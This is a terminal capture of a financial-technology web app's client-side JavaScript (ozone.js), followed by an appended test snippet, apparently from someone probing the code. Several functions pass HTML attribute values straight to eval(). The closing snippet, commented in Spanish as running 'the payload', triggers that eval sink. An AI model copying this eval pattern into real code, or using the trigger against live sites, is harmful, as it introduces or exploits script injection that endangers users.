 cat ozone.js              
//
// (c) Ozone Financial Technology Limited, 2017
//

/////////////////////////////////////////////////////////////////
//
// Hook up event handlers
//
/////////////////////////////////////////////////////////////////
$(document).ready(function () {
  //eslint-disable-line

  // Init the OUI
  // if (OzoneUI) {
  //   OzoneUI.init();
  // }
  var selectDropDown = $("select.select2").select2({
    placeholder: 'Choose one',
    allowClear: true
  });

  $("select.select2_roles").select2({
    placeholder: 'Choose one',
    allowClear: true,
    maximumSelectionLength: 1
  });


  $('.submitButton').on('click', function (e) {
    e.preventDefault();
    let _form = $(this).data('form');
    submitFormClassic(_form);
  });


  $('#resendOTP').on('click', function(event) {
    event.preventDefault();

    var form = document.createElement("form");
    form.method = "POST";
    form.action = "/resend";
    var emailAddress = document.createElement("input");
    emailAddress.value=document.getElementById("emailAddress").value;
    emailAddress.name="emailAddress";
    form.appendChild(emailAddress);
    document.body.appendChild(form);
    form.submit();
  });

  selectDropDown.on('select2:select', function (e) {
    var event = new Event('change');
    e.target.dispatchEvent(event);
  });
  $('[data-toggle="tooltip"]').tooltip();
  //
  // Tab changed
  // - render the datatable correctly
  //

  $('.off-canvas-pusher').css("position", "inherit");
  $('.help_menu').on('click', function (e) {
    $('.off-canvas-pusher').css("position", "fixed");
    e.preventDefault();
    var target = $(this).attr('href');
    var content = $(this).data('content');
    $('.off-canvas-content-area').html(content);
    $(target).addClass('show');
  });

  $('.close-off-canvas').on('click', function (e) {
    $('.off-canvas-pusher').css("position", "inherit");
    e.preventDefault();
    $('.off-canvas-content-area').html('');
    $('.off-canvas').removeClass('show');
  });

  $('time').each(function (i, el) {
    console.log($(el).attr('datetime'));
    var date = moment($(el).attr('datetime'));
    var _currentStringDate = $(el).html();
    var iscurrentDate = date.isSame(new Date(), "day");
    if (iscurrentDate) {
      $(el).html(`${date.fromNow()}`);
    }
  });

  // $('.accordion').accordion({
  //   heightStyle: 'content'
  // });


  $("#dark_theme").on("click", function (e) {
    if ($(this).is(":checked")) {
      _switchCSSFile("/css/o3-dark.css");
      setCookie("darkmode", "true");
    } else {
      _switchCSSFile("/css/o3-cool.css");
      deleteCookie("darkmode");
    }
  });


  if ($('#outageDuration').length > 0) {
    var cleaveD = new Cleave('#outageDuration', {
      time: true,
      timePattern: ['h', 'm', 's']
    });
  }

  let myTextarea = document.querySelector("#content");
  if (myTextarea) {
    var editor = CodeMirror.fromTextArea(myTextarea, {
      lineNumbers: true,
      mode: "application/json",
      gutters: ["CodeMirror-lint-markers"],
      lint: true,
    });
  }

  // $('.helpButton').on('click', function (event) {
  //   event.preventDefault();
  //   var _target = $(this).attr("href");
  //   // $(_target).modal({
  //   //   keyboard: false
  //   // });

  //   $(_target).modal('show')
  // });
  $(".js-range-slider").ionRangeSlider({
    skin: "round",
    values: [
      "1m",
      "10m",
      "15m",
      "1hr",
      "3hr",
      "1day",
      "5days",
      "7days",
      "1month",
      "1quarter",
      "1year",
    ],
    from: 0,
    to: 10,
    onChange: function (data) {
      console.dir(data);
    },
  });



  if ($(".datatables").DataTable != undefined) {
    $(".datatables").DataTable({
      responsive: true,
      // "scrollY": "60vh",
      language: {
        searchPlaceholder: "Search...",
      },
    });
  }


  // $(".count").each(function () {
  //   $(this)
  //     .prop("Counter", 0)
  //     .animate(
  //       {
  //         Counter: $(this).text(),
  //       },
  //       {
  //         duration: 500,
  //         easing: "swing",
  //         step: function (now) {
  //           $(this).text(Math.ceil(now));
  //         },
  //         complete: function (now) {
  //           $(this).text(now);
  //         },
  //       }
  //     );
  // });
  // $('a[data-toggle="tab"]').on('shown.bs.tab', function (e) { //eslint-disable-line
  //   $($.fn.dataTable.tables(true)).css('width', '100%');
  //   $($.fn.dataTable.tables(true)).DataTable().columns.adjust().draw();
  // });

  $(".theme_switcher").on("click", function (e) {
    e.preventDefault();
    console.log("Switch THeme", $(this).data("stylesheet"));
    _switchCSSFile($(this).data("stylesheet"));
  });

  $(".copy-text").on("click", function (e) {
    e.preventDefault();
    console.log(`Copied text : ${$(this).parent().text()}`);
    navigator.clipboard.writeText($(this).parent().text());
  });
  //
  // Tab change clicked
  // - change the URL fragment
  //
  $('a[data-toggle="tab"]').click(function (e) {
    window.location.hash = this.hash;
  });

  //
  // URL fragment manually changed (e.g. using back button)
  // - change the tab that is currently shown
  //
  window.addEventListener(
    "hashchange",
    function () {
      var changedHash = window.location.hash;
      changedHash && $('a[href="' + changedHash + '"]').tab("show");
    },
    false
  );
});

// handle #navigation on Tabs

$(function () {
  // hook loading of data tables once the page has loaded
  _loadDataTables();

  // hook loading of selects in forms once the page loads
  _hookSelects();

  // hook modals close event to clear the form
  _hookModals();

  // hook handlebars
  _hookHandlebars();

  // hook wizard navigation
  _hookWizardNavigation();
});

//
// Navigate to the right tab after the window loads
//
$(function () {
  const hash = window.location.hash;
  hash && $('a[href="' + hash + '"]').tab("show");
});

function _hookHandlebars() {
  $("script[data-src]").each(async function (index) {
    try {
      const id = $(this).attr("id");

      // compile it
      const source = this.innerHTML;
      const template = Handlebars.compile(source);

      // get the data
      const urlTemplate = $(this).attr("data-src");
      const url = _processUrlTemplate(urlTemplate);
      const data = await _fetchDataFromUrl(url);

      // merge the template
      const html = template(data);

      // render the result
      $(`div[data-target='${id}']`).html(html);

      // find the short targets, if any
      $(`[data-short-target='${id}']`).each(function () {
        const source = this.innerHTML;
        const template = Handlebars.compile(source);
        const html = template(data);
        $(this).html(html);
      });
    } catch (error) {
      console.log("Cought");
      console.log(error);
      _showAlert(
        "#rootAlert",
        "<b>Something went wrong while loading this page! </b> Try to reload the page or contact your administrator."
      );
    }
  });
}

function _processUrlTemplate(urlTemplate) {
  let url = "";

  const parts = urlTemplate.split("/");
  for (let i = 0; i < parts.length; i += 1) {
    const part = parts[i];

    if (part.charAt(0) === ":") {
      const param = part.substring(1);
      const paramValue = _qs(param);
      url += paramValue + "/";
    } else {
      url += part + "/";
    }
  }

  return url;
}

function _loadDataTables() {
  $("[data-o3-onload]").each(function (index) {
    const fn = $(this).attr("data-o3-onload");
    eval(fn);
  });

  // don't report datatable errors
  if ($.fn.dataTable !== undefined) {
    $.fn.dataTable.ext.errMode = "throw";
  }

  // hook datatables on tabs
  // loop through each tab pane
  $("div.tab-pane").each(function () {
    // check if it has a dataTable
    const targetId = $(this).attr("id");
    const table = $(this).find("table[data-o3-onshow]");

    if (table.length !== 0) {
      // tab-pane has a datatable!

      // identify the function to call onShow
      const fn = $(table).attr("data-o3-onshow");

      // identify the element in the tab-bar that triggers this
      $(`a[href='#${targetId}']`).on("show.bs.tab", function (e) {
        // ensure it has not already been loaded
        eval(fn);
      });
    }
  });
}

function _hookWizardNavigation() {
  // on clicking an element with an attribute of data-show-page, call doWizardNavigation
  $("[data-show-page]").each(function (index) {
    const target = $(this).attr("data-show-page");
    const formId = $(this).attr("data-validate-form");
    const handler = $(this).attr("data-handler");
    $(this).click(doWizardNavigation.bind(this, target, formId, handler));
  });
}

async function doWizardNavigation(target, formId, handler) {
  event.preventDefault();
  event.stopPropagation();

  // carry out form validation if a form is specified
  if (formId) {
    const form = $(formId);

    if (form.length !== 0) {
      const htmlForm = form.get(0);
      if (htmlForm.checkValidity() === false) {
        console.log("form values invalid. Navigation cancelled");
        htmlForm.classList.add("was-validated");
        return;
      }
    }
  }

  // call a handler if specified
  if (handler) {
    // const result = eval(`await ${handler}()`);

    // const result = await createSelfServiceClient();
    const result = await eval("createSelfServiceClient()");

    if (result !== true) {
      return;
    }
  }

  // all good, switch pages
  console.log(`Wizard will display ${target}`);
  $("#wizardContent .tab-pane").addClass("fade");
  $("#wizardContent .tab-pane").removeClass("active show");
  $(target).addClass("active show");
}

function _hookSelects() {
  $("select[data-src-url]").each(function (index) {
    _hookSelect(this);
  });
}

function _hookSelect(select) {
  const filter = $(select).attr("data-filter");

  if (filter) {
    _hookSelectWithFilter(select);
  } else {
    _populateSelect(select);
  }
}

function _hookSelectWithFilter(select) {
  const filterSource = $(select).attr("data-filter");

  console.log(`${$(select).attr("id")} hooked on ${filterSource}`);

  $(filterSource).change(function () {
    console.log("boom");
    const filterValue = $(filterSource + " option:selected").val();
    console.log(`Change in ${filterSource}`);
    console.log(`new val: ${filterValue}`);
    console.log(`modifying: ${$(select).attr("id")} `);
    _populateSelect(select, filterValue);
  });
}

async function _populateSelect(select, filterValue) {
  $(select).find("option").remove();

  const id = $(select).attr("id");
  let url = $(select).attr("data-src-url");

  const optionId = $(select).attr("data-src-id");
  const optionDisplay = $(select).attr("data-src-display");
  const dataElement = $(select).attr("data-data-element");
  const multiple = $(select).attr("multiple");
  const mapper = $(select).attr("data-mapper");

  if (filterValue) {
    const filterField = $(select).attr("data-filter-name");
    url += `?filter={"${filterField}":"${filterValue}"}`;
  }

  let data = await _fetchDataFromUrl(url);

  if (dataElement) {
    data = _resolve(dataElement, data[0]);
  }

  if (!multiple) $(select).append($("<option>"));

  if (mapper) {
    data = eval(mapper)(data);
  }

  $(data).each(function () {
    let row = this;

    if (row[optionId]) {
      $(select).append(
        $("<option>").attr("value", row[optionId]).text(row[optionDisplay])
      );
    } else {
      $(select).append($("<option>").attr("value", row).text(row));
    }
  });
}

function _hookModals() {
  $("div.modal[data-form-id]").each(function () {
    const formId = $(this).attr("data-form-id");
    $(this).on("hide.bs.modal", function (e) {
      clearForm(formId);
    });
  });
}

async function _fetchDataFromUrl(url) {
  const toRet = await $.ajax({
    type: "GET",
    url,
    cache: true,
    datatype: "json",
    headers: {
      "content-type": "application/json",
    },
    processData: false,
  });

  return toRet;
}

function clearForm(formId) {
  const form = document.getElementById(formId);

  form.reset();

  form.classList.remove("was-validated");

  // clear the filtered selects
  $(form)
    .find("select")
    .each(function (index) {
      const filter = $(this).attr("data-filter");
      const multiple = $(this).attr("multiple");

      if (filter) {
        $(this).find("option").remove();
        if (!multiple) $(this).append($("<option>"));
      }
    });
}

async function submitForm(formId) {
  const form = document.getElementById(formId);

  // validate the form
  if (form.checkValidity() === false) {
    event.preventDefault();
    event.stopPropagation();
    form.classList.add("was-validated");
    return;
  }
  form.classList.add("was-validated");

  // collect the form fields
  const data = _collectFormFields(form);

  // submit the form
  try {
    const method = $(form).attr("method");
    const action = $(form).attr("action");

    await $.ajax({
      type: method,
      url: action,
      datatype: "json",
      headers: {
        "content-type": "application/json",
      },
      data: JSON.stringify(data),
      processData: false,
    });

    location.reload();
  } catch (err) {
    console.log(err);

    if (err.status === 500) {
      $("#alert")
        .show()
        .html(
          "<b>Unhandled error. Please inform your Ozone administrator:</b><br/>" +
          err.responseText
        );
    } else {
      $("#alert")
        .show()
        .html(
          "<b>Please fix the following errors and try again:</b><br/>" +
          err.responseText
        );
    }

    form.classList.remove("was-validated");
  }

  // close the popup
}

async function submitFormClassic(formId) {
  // event.preventDefault();
  // event.stopPropagation();

  const form = document.getElementById(formId);

  if (
    document.querySelectorAll(".checkbox-group-required").length >= 1 &&
    _requiredGroupByType("checkbox") === false
  ) {
    form.classList.add("was-validated");
    return;
  }

  if (
    document.querySelectorAll(".radio-group-required").length >= 1 &&
    _requiredGroupByType("radio") === false
  ) {
    form.classList.add("was-validated");
    return;
  }

  // validate the form
  if (form.checkValidity() === false) {
    form.classList.add("was-validated");
    return;
  }

  // submit it
  form.submit();
}

function _collectFormFields(form) {
  const toRet = {};

  $(form)
    .find("select")
    .each(function (index) {
      _collectSelect(toRet, $(this));
    });

  $(form)
    .find("input")
    .each(function (index) {
      _collectInput(toRet, $(this));
    });

  return toRet;
}

function _collectSelect(data, select) {
  const multiple = select.attr("multiple");
  const id = select.attr("id");
  const valueField = select.attr("data-value-field");
  const idField = select.attr("data-id-field");

  let toRet;
  if (multiple) {
    toRet = [];
    if (valueField) {
      select.find("option:selected").each(function () {
        const row = {};
        row[valueField] = $(this).text();
        row[idField] = $(this).val();
        toRet.push(row);
      });
    } else {
      select.find("option:selected").each(function () {
        toRet.push($(this).val());
      });
    }
  } else {
    if (valueField) {
      toRet = {};
      toRet[valueField] = select.find("option:selected").text();
      toRet[idField] = select.val();
    } else {
      toRet = select.find("option:selected").text();
    }
  }

  data[id] = toRet;
}

function _collectInput(data, input) {
  const id = input.attr("id");
  data[id] = input.val();
}

function _requiredGroupByType(type) {
  const elements = Array.from(
    document.querySelectorAll(`.${type}-group-required [type=${type}]`)
  );
  return elements.reduce((acc, curr) => acc || curr.checked, false);
}

function _requiredCheckboxGroup() {
  const checkboxes = Array.from(
    document.querySelectorAll(".checkbox-group-required [type=checkbox]")
  );
  return checkboxes.reduce((acc, curr) => acc || curr.checked, false);
}

function populateDataTable(params) {
  // find any filters that we support
  const filter = _buildFilter(params.filters, params.fixedFilters);

  let url = params.url;

  if (filter !== {}) {
    url = `${url}?filter=${filter}`;
  }

  // see if we hook up an external search field
  let dom;
  if (params.externalSearch) {
    dom = "itr";

    // hook up the external input field
    $(params.externalSearch.field).change(function () {
      const table = $(params.tableId).DataTable();
      table.search(this.value).draw();
    });

    // hook up the external input field
    $(params.externalSearch.button).click(function () {
      const table = $(params.tableId).DataTable();
      const searchValue = $(params.externalSearch.field).val();
      table.search(searchValue).draw();
    });
  } else {
    dom = "tirf";
  }

  if (params.scrollY === undefined) {
    params.scrollY = "70vh";
  }
  console.log(`scroll: ${params.scrollY}`);

  if (params.selectable) {
    // add a handle column
    const col = {
      data: null,
      defaultContent: " ",
      width: "1px",
      orderable: false,
    };
    params.columns.unshift(col);
    console.log(params.columns);
  }

  // if params.dom is specified, over-ride the dom
  if (params.dom) {
    dom = params.dom;
  }

  const table = $(params.tableId).DataTable({
    dom,
    retrieve: true,
    ajax: {
      url,
      dataSrc: "",
    },
    scrollY: params.scrollY,
    pageResize: true,
    scrollCollapse: true,
    paging: false,
    columns: params.columns,
    order: params.order,
  });

  if (params.selectable) {
    // hook up events
    $(`${params.tableId} tbody`).on("click", "tr", function () {
      $(this).toggleClass("selected");
      $(this).find("td").toggleClass("selected");
      $(this).find("td:first-child").toggleClass("selectedHandle");
    });
  }
}

function reloadDataTable(target) {
  const table = $(target).DataTable();
  table.ajax.reload();
}

function deleteRows(locator) {
  // find the selected rows
  const table = $(locator).DataTable();
  const selectedRows = table.rows(".selected").data();
  console.log(selectedRows);
  console.log(selectedRows.length);

  if (selectedRows.length < 1) {
    alert("You must select at least one row to delete.");
    return;
  }

  // ready to roll, lets show the modal
  $("#deleteRowCount").html(selectedRows.length);
  $("#confirmDeleteButton").attr("onClick", `confirmDeleteRows("${locator}")`);

  $("#deleteModal").modal("show");
}

function confirmDeleteRows(locator) {
  alert(locator);
}

function _buildFilter(filters, jsonFilters) {
  if (jsonFilters === undefined) {
    jsonFilters = {};
  }

  for (let i = 0; i < filters.length; i += 1) {
    const filter = filters[i];
    const filterValue = _qs(filter);
    if (filterValue !== null) {
      jsonFilters[filter] = filterValue;
    }
  }

  return JSON.stringify(jsonFilters);
}

function _qs(key) {
  key = key.replace(/[*+?^$.\[\]{}()|\\\/]/g, "\\$&"); // escape RegEx meta chars
  var match = location.search.match(new RegExp("[?&]" + key + "=([^&]+)(&|$)"));
  return match && decodeURIComponent(match[1].replace(/\+/g, " "));
}

function _resolve(path, obj) {
  return path.split(".").reduce(function (prev, curr) {
    return prev ? prev[curr] : null;
  }, obj || self);
}

function _showAlert(locator, html) {
  console.log("showing error");
  $(locator).show().html(html);
}

function _switchCSSFile(filePath) {
  var cssFile = document.getElementById("master-css");
  cssFile.href = filePath;
  setCookie("cssResource", filePath, 120);
}

function setCookie(cname, cvalue, exdays) {
  var d = new Date();
  d.setTime(d.getTime() + exdays * 24 * 60 * 60 * 1000);
  var expires = "expires=" + d.toUTCString();
  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
  var name = cname + "=";
  var decodedCookie = decodeURIComponent(document.cookie);
  var ca = decodedCookie.split(";");
  for (var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == " ") {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}

function eraseCookie(name) {
  document.cookie = name + "=; Max-Age=-99999999;";
}

function deleteCookie(name) {
  setCookie(name, "", -1);
}

document.querySelectorAll('input[type="number"]').forEach(input => {
  input.oninput = () => {
    if(input.value.length > input.maxLength) input.value = input.value.slice(0, input.maxLength);
  }
});        
<script>
  window.onload = () => {
    const select = document.querySelector('select[data-mapper]');
    const mapper = select?.getAttribute('data-mapper');
    if (mapper) {
      eval(mapper)();  // <-- Esto ejecuta el payload
    }
  };
</script>
